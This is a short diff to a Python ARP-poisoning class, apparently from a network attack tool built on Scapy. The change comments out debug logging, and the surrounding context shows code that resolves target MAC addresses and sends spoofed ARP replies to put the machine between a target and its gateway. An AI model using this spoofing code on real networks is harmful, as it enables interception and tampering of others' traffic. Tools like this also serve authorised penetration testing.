@@ -175,7 +175,7 @@ class ARPpoisoner:
 
         try:
             targetmac = self.arp_cache[targetip] # see if we already resolved that address
-            log.debug('{} has already been resolved'.format(targetip))
+            #log.debug('{} has already been resolved'.format(targetip))
         except KeyError:
             #This following replaces getmacbyip(), much faster this way
             packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
@@ -211,7 +211,7 @@ class ARPpoisoner:
 
                         if targetmac is not None: 
                             try:
-                                log.debug("Poisoning {} <-> {}".format(targetip, self.gatewayip))
+                                #log.debug("Poisoning {} <-> {}".format(targetip, self.gatewayip))
                                 self.s.send(ARP(pdst=targetip, psrc=self.gatewayip, hwdst=targetmac, op=arpmode))
                                 self.s.send(ARP(pdst=self.gatewayip, psrc=targetip, hwdst=self.gatewaymac, op=arpmode))
                             except Exception as e:
